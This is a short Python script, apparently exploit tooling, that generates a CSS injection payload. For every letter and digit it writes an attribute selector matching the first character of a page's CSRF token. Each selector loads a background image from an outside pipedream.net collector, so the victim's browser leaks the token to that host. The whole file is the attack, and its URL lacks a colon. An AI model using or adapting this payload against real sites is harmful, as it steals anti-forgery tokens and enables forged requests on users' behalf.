import string
import itertools

charset = string.ascii_letters+string.digits
css = "body{ background: black;}\n"
know = "y"

combinations = itertools.combinations(charset,1)

for letter in combinations:
  option = "".join(letter)
  css += f"input[name=csrf][value^={option}]"+"{background-image: url(https//eoa21cz1z5v9xqj.m.pipedream.net"+f"/{option})"+'};'
  css += "\n"
  with open ('style.css',"w") as file:

    file.write(css)

# for i in combinations:
#     print(i)

print(css)